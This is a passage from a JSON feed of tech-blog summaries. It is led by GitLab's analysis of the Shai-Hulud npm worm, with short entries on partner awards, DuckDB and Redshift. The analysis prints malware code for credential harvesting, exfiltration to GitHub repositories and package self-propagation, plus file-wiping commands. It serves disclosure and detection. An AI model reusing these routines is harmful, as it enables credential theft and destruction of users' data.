      "summary": "GitLab's Vulnerability Research team has identified an active, large-scale supply chain attack involving a destructive malware variant spreading through the npm ecosystem. Our internal monitoring system has uncovered multiple infected packages containing what appears to be an evolved version of the \" Shai-Hulud \" malware. Early analysis shows worm-like propagation behavior that automatically infects additional packages maintained by impacted developers. Most critically, we've discovered the malware contains a \" dead man's switch \" mechanism that threatens to destroy user data if its propagation and exfiltration channels are severed. We verified that GitLab was not using any of the malicious packages and are sharing our findings to help the broader security community respond effectively. Inside the attack Our internal monitoring system, which scans open-source package registries for malicious packages, has identified multiple npm packages infected with sophisticated malware that: Harvests credentials from GitHub, npm, AWS, GCP, and Azure Exfiltrates stolen data to attacker-controlled GitHub repositories Propagates by automatically infecting other packages owned by victims Contains a destructive payload that triggers if the malware loses access to its infrastructure While we've confirmed several infected packages, the worm-like propagation mechanism means many more packages are likely compromised. The investigation is ongoing as we work to understand the full scope of this campaign. Technical analysis: How the attack unfolds Initial infection vector The malware infiltrates systems through a carefully crafted multi-stage loading process. Infected packages contain a modified package.json with a preinstall script pointing to setup_bun.js . This loader script appears innocuous, claiming to install the Bun JavaScript runtime, which is a legitimate tool. However, its true purpose is to establish the malware's execution environment. // This file gets added to victim's packages as setup_bun.js\n#!/usr/bin/env node\nasync function downloadAndSetupBun() {\n  // Downloads and installs bun\n  let command = process.platform === 'win32' \n    ? 'powershell -c \"irm bun.sh/install.ps1|iex\"'\n    : 'curl -fsSL https://bun.sh/install | bash';\n  \n  execSync(command, { stdio: 'ignore' });\n  \n  // Runs the actual malware\n  runExecutable(bunPath, ['bun_environment.js']);\n} The setup_bun.js loader downloads or locates the Bun runtime on the system, then executes the bundled bun_environment.js payload, a 10MB obfuscated file already present in the infected package. This approach provides multiple layers of evasion: the initial loader is small and seemingly legitimate, while the actual malicious code is heavily obfuscated and bundled into a file too large for casual inspection. Credential harvesting Once executed, the malware immediately begins credential discovery across multiple sources: GitHub tokens : Searches environment variables and GitHub CLI configurations for tokens starting with ghp_ (GitHub personal access token) or gho_ (GitHub OAuth token) Cloud credentials : Enumerates AWS, GCP, and Azure credentials using official SDKs, checking environment variables, config files, and metadata services npm tokens : Extracts tokens for package publishing from .npmrc files and environment variables, which are common locations for securely storing sensitive configuration and credentials. Filesystem scanning : Downloads and executes Trufflehog, a legitimate security tool, to scan the entire home directory for API keys, passwords, and other secrets hidden in configuration files, source code, or git history async function scanFilesystem() {\n  let scanner = new Trufflehog();\n  await scanner.initialize();\n  \n  // Scan user's home directory for secrets\n  let findings = await scanner.scanFilesystem(os.homedir());\n  \n  // Upload findings to exfiltration repo\n  await github.saveContents(\"truffleSecrets.json\", \n    JSON.stringify(findings));\n} Data exfiltration network The malware uses stolen GitHub tokens to create public repositories with a specific marker in their description: \"Sha1-Hulud: The Second Coming.\" These repositories serve as dropboxes for stolen credentials and system information. async function createRepo(name) {\n  // Creates a repository with a specific description marker\n  let repo = await this.octokit.repos.createForAuthenticatedUser({\n    name: name,\n    description: \"Sha1-Hulud: The Second Coming.\", // Marker for finding repos later\n    private: false,\n    auto_init: false,\n    has_discussions: true\n  });\n  \n  // Install GitHub Actions runner for persistence\n  if (await this.checkWorkflowScope()) {\n    let token = await this.octokit.request(\n      \"POST /repos/{owner}/{repo}/actions/runners/registration-token\"\n    );\n    await installRunner(token); // Installs self-hosted runner\n  }\n  \n  return repo;\n} Critically, if the initial GitHub token lacks sufficient permissions, the malware searches for other compromised repositories with the same marker, allowing it to retrieve tokens from other infected systems. This creates a resilient botnet-like network where compromised systems share access tokens. // How the malware network shares tokens:\nasync fetchToken() {\n  // Search GitHub for repos with the identifying marker\n  let results = await this.octokit.search.repos({\n    q: '\"Sha1-Hulud: The Second Coming.\"',\n    sort: \"updated\"\n  });\n  \n  // Try to retrieve tokens from compromised repos\n  for (let repo of results) {\n    let contents = await fetch(\n      `https://raw.githubusercontent.com/${repo.owner}/${repo.name}/main/contents.json`\n    );\n    \n    let data = JSON.parse(Buffer.from(contents, 'base64').toString());\n    let token = data?.modules?.github?.token;\n    \n    if (token && await validateToken(token)) {\n      return token;  // Use token from another infected system\n    }\n  }\n  return null;  // No valid tokens found in network\n} Supply chain propagation Using stolen npm tokens, the malware: Downloads all packages maintained by the victim Injects the setup_bun.js loader into each package's preinstall scripts Bundles the malicious bun_environment.js payload Increments the package version number Republishes the infected packages to npm async function updatePackage(packageInfo) {\n  // Download original package\n  let tarball = await fetch(packageInfo.tarballUrl);\n  \n  // Extract and modify package.json\n  let packageJson = JSON.parse(await readFile(\"package.json\"));\n  \n  // Add malicious preinstall script\n  packageJson.scripts.preinstall = \"node setup_bun.js\";\n  \n  // Increment version\n  let version = packageJson.version.split(\".\").map(Number);\n  version[2] = (version[2] || 0) + 1;\n  packageJson.version = version.join(\".\");\n  \n  // Bundle backdoor installer\n  await writeFile(\"setup_bun.js\", BACKDOOR_CODE);\n  \n  // Repackage and publish\n  await Bun.$`npm publish ${modifiedPackage}`.env({\n    NPM_CONFIG_TOKEN: this.token\n  });\n} The dead man's switch Our analysis uncovered a destructive payload designed to protect the malware‚Äôs infrastructure against takedown attempts. The malware continuously monitors its access to GitHub (for exfiltration) and npm (for propagation). If an infected system loses access to both channels simultaneously, it triggers immediate data destruction on the compromised machine. On Windows, it attempts to delete all user files and overwrite disk sectors. On Unix systems, it uses shred to overwrite files before deletion, making recovery nearly impossible. // CRITICAL: Token validation failure triggers destruction\nasync function aL0() {\n  let githubApi = new dq();\n  let npmToken = process.env.NPM_TOKEN || await findNpmToken();\n  \n  // Try to find or create GitHub access\n  if (!githubApi.isAuthenticated() || !githubApi.repoExists()) {\n    let fetchedToken = await githubApi.fetchToken(); // Search for tokens in compromised repos\n    \n    if (!fetchedToken) {  // No GitHub access possible\n      if (npmToken) {\n        // Fallback to NPM propagation only\n        await El(npmToken);\n      } else {\n        // DESTRUCTION TRIGGER: No GitHub AND no NPM access\n        console.log(\"Error 12\");\n        if (platform === \"windows\") {\n          // Attempts to delete all user files and overwrite disk sectors\n          Bun.spawnSync([\"cmd.exe\", \"/c\", \n            \"del /F /Q /S \\\"%USERPROFILE%*\\\" && \" +\n            \"for /d %%i in (\\\"%USERPROFILE%*\\\") do rd /S /Q \\\"%%i\\\" & \" +\n            \"cipher /W:%USERPROFILE%\"  // Overwrite deleted data\n          ]);\n        } else {\n          // Attempts to shred all writable files in home directory\n          Bun.spawnSync([\"bash\", \"-c\", \n            \"find \\\"$HOME\\\" -type f -writable -user \\\"$(id -un)\\\" -print0 | \" +\n            \"xargs -0 -r shred -uvz -n 1 && \" +  // Overwrite and delete\n            \"find \\\"$HOME\\\" -depth -type d -empty -delete\"  // Remove empty dirs\n          ]);\n        }\n        process.exit(0);\n      }\n    }\n  }\n} This creates a dangerous scenario. If GitHub mass-deletes the malware's repositories or npm bulk-revokes compromised tokens, thousands of infected systems could simultaneously destroy user data. The distributed nature of the attack means that each infected machine independently monitors access and will trigger deletion of the user‚Äôs data when a takedown is detected. Indicators of compromise To aid in detection and response, here is a more comprehensive list of the key indicators of compromise (IoCs) identified during our analysis. Type Indicator Description file bun_environment.js Malicious post-install script in node_modules directories directory .truffler-cache/ Hidden directory created in user home for Trufflehog binary storage directory .truffler-cache/extract/ Temporary directory used for binary extraction file .truffler-cache/trufflehog Downloaded Trufflehog binary (Linux/Mac) file .truffler-cache/trufflehog.exe Downloaded Trufflehog binary (Windows) process del /F /Q /S \"%USERPROFILE%*\" Windows destructive payload command process shred -uvz -n 1 Linux/Mac destructive payload command process cipher /W:%USERPROFILE% Windows secure deletion command in payload command `curl -fsSL https://bun.sh/install bash` command `powershell -c \"irm bun.sh/install.ps1 iex\"` How GitLab can help you detect this malware campaign If you are using GitLab Ultimate, you can leverage built-in security capabilities to immediately surface exposure tied to this attack within your projects. First, enable Dependency Scanning to automatically analyze your project's dependencies against known vulnerability databases. If infected packages are present in your package-lock.json or yarn.lock files, Dependency Scanning will flag them in your pipeline results and the Vulnerability Report. For complete setup instructions, refer to the Dependency Scanning documentation . Once enabled, merge requests introducing a compromised package will surface a warning before the code reaches your main branch. Next, GitLab Duo Chat can be used with Dependency Scanning to provide a fast way to check your project's exposure without navigating through reports. From the dropdown, select the Security Analyst Agent and simply ask questions like: \"Are any of my dependencies affected by the Shai-Hulud v2 malware campaign?\" \"Does this project have any npm supply chain vulnerabilities?\" \"Does this project have any npm supply chain vulnerabilities?\" \"Show me critical vulnerabilities in my JavaScript dependencies.\" The agent will query your project's vulnerability data and provide a direct answer, helping security teams triage quickly across multiple projects. For teams managing many repositories, we recommend combining these approaches: use Dependency Scanning for continuous automated detection in CI/CD, and the Security Analyst Agent for ad-hoc investigation and rapid response during active incidents like this one. Looking ahead This campaign represents an evolution in supply chain attacks where the threat of collateral damage becomes the primary defense mechanism for the attacker's infrastructure. The investigation is ongoing as we work with the community to understand the full scope and develop safe remediation strategies. GitLab's automated detection systems continue to monitor for new infections and variations of this attack. By sharing our findings early, we hope to help the community respond effectively while avoiding the pitfalls created by the malware's dead man's switch design.",
      "published_ts": 1763942400,
      "source_name": "GitLab Engineering",
      "content_type": "technical"
    },
    {
      "url": "https://about.gitlab.com/blog/meet-the-2025-emea-gitlab-partner-award-winners/",
      "title": "Meet the 2025 EMEA GitLab Partner Award winners",
      "summary": "At GitLab, our Partner Program has fostered a robust ecosystem of DevSecOps professionals dedicated to driving customer software development innovation and achieving meaningful outcomes. This year, several partners in Europe, the Middle East, and Africa (EMEA) have truly excelled in their DevSecOps expertise and value-added services. Earlier this month, EMEA partners from our channel, technology, and cloud networks gathered for an event to celebrate their achievements, strengthen their capabilities, and outline future initiatives. During this event, we proudly recognized several partners for their exceptional contributions to GitLab and our shared customers. We are pleased to announce our 2025 GitLab Partner Award Winners from the EMEA region across five categories: Regional Partner of the Year Awards - Recognizing the partner in each region who demonstrated exceptional overall performance and strategic collaboration. Central Europe: cc cloud GmbH cc cloud is a subsidiary of codecentric AG that supports organizations from consulting through to managed services, guiding their digitalization journey and transformation. Northern Europe: Adaptavist Adaptavist, part of The Adaptavist Group, empowers clients with comprehensive services and solutions across Agile, DevOps, Work Management, ITSM, and Cloud, supporting their workflows, business transformation, and high-growth strategies. Southern Europe: knowmad mood Knowmad mood is a consulting, IT services, and software development company offering innovative solutions that support customers on their digital transformation journey. Meta: Middle East, Turkey and Africa: Digital Future Digital Future serves as a one-stop-shop for enterprise agility, helping customers accelerate their go-to-market across three critical transformation areas: talent, technology, and skills. Emerging Markets: Eastern Europe and Israel: Cloudfresh Cloudfresh is a certified GitLab partner partnering with organizations to accelerate software delivery and strengthen security across their DevSecOps journey. From PoC and training to ongoing support and AI-driven guidance, every step is shaped around the organization‚Äôs unique IT landscape. Best Technical Solution/Project - Honoring the partner who delivered the most innovative, complex, or impactful technical solution for a customer. D|OPS Digital D|OPS Digital, part of The Adaptavist Group, empowers organizations to maximize their technology investments while enabling developers to reach their full potential. Most Certified and Enabled Partner - Awarding the partner with the most GitLab-certified professionals on their team. Devoteam Devoteam is a leading consulting firm focused on digital strategy, tech platforms, cybersecurity, and business transformation. Rookie of the Year - Recognizing the newest partner who achieved early success and made significant impact. Conoa Conoa provides end-to-end solutions and leading expertise, including consulting services, training, workshops, products, tools, and their own managed container platform. First Order Master - Celebrating the partner who excels at acquiring new customers and consistently wins new business. Gantek Gantek is an Information Technologies company that provides value-added services, addressing the infrastructure and application/software needs of digital technology and systems from end-to-end.",
      "published_ts": 1763942400,
      "source_name": "GitLab Engineering",
      "content_type": "technical"
    }
  ],
  "news_general": [],
  "python_analytics": [
    {
      "url": "https://blog.zenika.com/2025/11/26/duckdb-on-aws-lambda-the-easy-way-with-layers/",
      "title": "DuckDB on AWS Lambda: The Easy Way with Layers",
      "summary": "This article shows how I used DuckDB in AWS Lambda in an easy way. I'll explain how my pre-built Lambda layers bypass complex build processes, allowing you to use DuckDB for efficient serverless analytics with ease.",
      "published_ts": 1764154404,
      "source_name": "Zenika Tech Blog",
      "content_type": "technical"
    }
  ],
  "warehouses_engines": [
    {
      "url": "https://duckdb.org/2025/11/28/iceberg-writes-in-duckdb.html",
      "title": "Writes in DuckDB-Iceberg",
      "summary": "We shipped a number of features and improvements to the DuckDB-Iceberg extension: insert, update, and delete statements are all supported now.",
      "published_ts": 1764288000,
      "source_name": "DuckDB Blog",
      "content_type": "technical"
    },
    {
      "url": "https://aws.amazon.com/blogs/big-data/run-apache-spark-and-iceberg-4-5x-faster-than-open-source-spark-with-amazon-emr/",
      "title": "Run Apache Spark and Iceberg 4.5x faster than open source Spark with Amazon EMR",
      "summary": "This post shows how Amazon EMR 7.12 can make your Apache Spark and Iceberg workloads up to 4.5x faster performance.",
      "published_ts": 1764207979,
      "source_name": "Redshift / AWS Big Data",
      "content_type": "technical"
    },
    {
      "url": "https://aws.amazon.com/blogs/big-data/run-apache-spark-and-apache-iceberg-write-jobs-2x-faster-with-amazon-emr/",
      "title": "Run Apache Spark and Apache Iceberg write jobs 2x faster with Amazon EMR",
      "summary": "In this post, we demonstrate the write performance benefits of using the Amazon EMR 7.12 runtime for Spark and Iceberg compares to open source Spark 3.5.6 with Iceberg 1.10.0 tables on a 3TB merge workload.",
      "published_ts": 1764205388,
      "source_name": "Redshift / AWS Big Data",
      "content_type": "technical"
    },
    {
      "url": "https://aws.amazon.com/blogs/big-data/achieve-2x-faster-data-lake-query-performance-with-apache-iceberg-on-amazon-redshift/",
      "title": "Achieve 2x faster data lake query performance with Apache Iceberg on Amazon Redshift",
      "summary": "In 2025, Amazon Redshift delivered several performance optimizations that improved query performance over twofold for Iceberg workloads on Amazon Redshift Serverless, delivering exceptional performance and cost-effectiveness for your data lake workloads. In this post, we describe some of the optimizations that led to these performance gains.",
      "published_ts": 1764195375,
      "source_name": "Redshift / AWS Big Data",
      "content_type": "technical"
    },
    {
      "url": "https://aws.amazon.com/blogs/big-data/getting-started-with-apache-iceberg-write-support-in-amazon-redshift/",
      "title": "Getting started with Apache Iceberg write support in Amazon Redshift",
      "summary": "In this post, we show how you can use Amazon Redshift to write data directly to Apache Iceberg tables stored in Amazon S3 and S3 Tables for seamless integration between your data warehouse and data lake while maintaining ACID compliance.",
      "published_ts": 1764185695,
      "source_name": "Redshift / AWS Big Data",
      "content_type": "technical"
    },
    {
      "url": "https://aws.amazon.com/blogs/big-data/save-up-to-24-on-amazon-redshift-serverless-compute-costs-with-reservations/",
      "title": "Save up to 24% on Amazon Redshift Serverless compute costs with Reservations",
      "summary": "In this post, you learn how Amazon Redshift Serverless Reservations can help you lower your data warehouse costs. We explore ways to determine the optimal number of RPUs to reserve, review example scenarios, and discuss important considerations when purchasing these reservations.",
      "published_ts": 1764022463,
      "source_name": "Redshift / AWS Big Data",
      "content_type": "technical"
    }
  ]
}